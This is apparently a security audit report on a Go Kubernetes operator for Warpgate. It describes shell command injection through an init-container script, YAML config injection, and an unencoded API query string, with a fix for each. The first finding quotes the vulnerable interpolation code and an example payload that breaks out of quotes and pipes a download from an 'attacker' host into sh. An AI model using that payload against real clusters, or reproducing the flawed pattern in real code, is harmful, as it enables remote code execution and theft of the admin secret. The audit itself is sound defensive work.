summary: Reviewed the warpgate-operator Go Kubernetes operator across api/v1alpha1 (CRD types and admission webhooks), cmd/main.go, and internal/ (controllers and the Warpgate REST API client). The most serious issue is shell command injection: the WarpgateInstance controller builds an init-container shell script by string-interpolating unvalidated spec fields (notably spec.databaseURL) and runs it via /bin/sh -c, letting anyone who can create/update a WarpgateInstance CR execute arbitrary commands in the resulting pod. A related config-injection flaw lets the same fields inject arbitrary YAML into the generated warpgate.yaml, and the API client concatenates unencoded user-controlled values into request query strings. Credential handling (crypto/rand passwords, Secret storage) and the metrics/webhook TLS setup looked sound. Dynamic behavior (admission webhook enforcement at runtime, RBAC that gates who may create these CRs) was not executed and is assumed from the code.

findings.title: Shell command injection via spec.databaseURL in WarpgateInstance init-container script
findings.description: buildDeployment assembles the init container's command as a single shell script (joined scriptParts) that is executed with Command: []string{"/bin/sh", "-c", initScript} (line 776). The setup command is built with fmt.Sprintf and the raw, unvalidated spec.databaseURL is interpolated inside double quotes: `--database-url "<databaseURL>"`. The WarpgateInstance admission webhook (api/v1alpha1/warpgateinstance_webhook.go, validateWarpgateInstance) only emits a warning for databaseURL and performs no character validation, and the field is a free-form string in the CRD (api/v1alpha1/warpgateinstance_types.go:86). A value such as `x"; curl http://attacker/x | sh; echo "` (or `$(...)` / backtick substitution) breaks out of the quotes and runs attacker-controlled commands in the init container, which has the ADMIN_PASSWORD secret in its environment and the data PVC mounted. Any principal with RBAC to create or update a WarpgateInstance in any namespace the operator watches can achieve arbitrary command execution in the provisioned pod.
findings.evidence:
line 549-558:
  setupCmd := fmt.Sprintf(`warpgate ... --admin-password "${ADMIN_PASSWORD}"`, instanceHTTPPort(inst))
  ...
  if inst.Spec.DatabaseURL != "" {
    setupCmd += fmt.Sprintf(` --database-url "%s"`, inst.Spec.DatabaseURL)
  }
The script is then run at line 776: Command: []string{"/bin/sh", "-c", initScript}. No validation of DatabaseURL exists (webhook only warns at warpgateinstance_webhook.go:256-258).
findings.recommendation: Do not build shell strings from CR fields. Pass user-controlled values as separate argv elements (e.g. Command/Args slices without `sh -c`, or via environment variables referenced as "${DATABASE_URL}" with the value supplied through an EnvVar rather than interpolated into the script). If interpolation is unavoidable, strictly validate databaseURL in the webhook against an allowlist/pattern (e.g. a URL regex permitting only `postgres://`/`sqlite:` with no shell metacharacters) and reject the request otherwise.

findings.title: YAML config injection via spec.externalHost/spec.databaseURL into generated warpgate.yaml
findings.description: buildWarpgateConfig produces warpgate.yaml by fmt.Fprintf-ing CR string fields directly into the document instead of marshaling a struct. spec.externalHost is written unquoted as `external_host: <value>\n` (lines 379-381) and spec.databaseURL as `database_url: "<value>"\n` (lines 344-345). Kubernetes string fields may contain newlines and quotes, and neither field is validated by the WarpgateInstance webhook. An attacker who can create/update a WarpgateInstance can embed newlines to inject arbitrary top-level YAML keys (e.g. overriding database_url, disabling TLS, or redefining listeners) into the configuration the Warpgate server then loads, altering its security posture. This ConfigMap is mounted and copied to /data/warpgate.yaml and consumed by the running server.
findings.recommendation: Generate the config by marshaling a typed struct with a YAML library (gopkg.in/yaml.v3) so values are safely quoted/escaped, rather than hand-formatting with Fprintf. Additionally validate externalHost (hostname pattern) and databaseURL (URL pattern, no newlines) in the admission webhook.

findings.title: Unencoded user-controlled search term concatenated into Warpgate API query string
findings.description: ListUsers builds the request path by concatenating the raw search term into the query string (`path += "?search=" + search`) with no URL encoding. The search value originates from user-controlled CR fields (e.g. a WarpgatePasswordCredential/WarpgateUser spec.username resolved via GetUserByUsername -> ListUsers). Characters such as '#', '&', '/', or spaces are not escaped, so a crafted name can truncate or append query parameters and change which records the Warpgate API returns. The same pattern appears in internal/warpgate/role.go:59-63 (ListRoles) and internal/warpgate/target.go:206-210 (ListTargets). Exploitability is limited because callers (GetUserByUsername/GetRoleByName/GetTargetByName) re-filter for an exact name match, so impact is low, but it is an injection into a request the operator makes with privileged credentials.
findings.recommendation: Build the query with net/url: use url.Values{"search": {search}}.Encode() or url.QueryEscape(search) before appending, so the operator-supplied search term cannot alter the request structure.
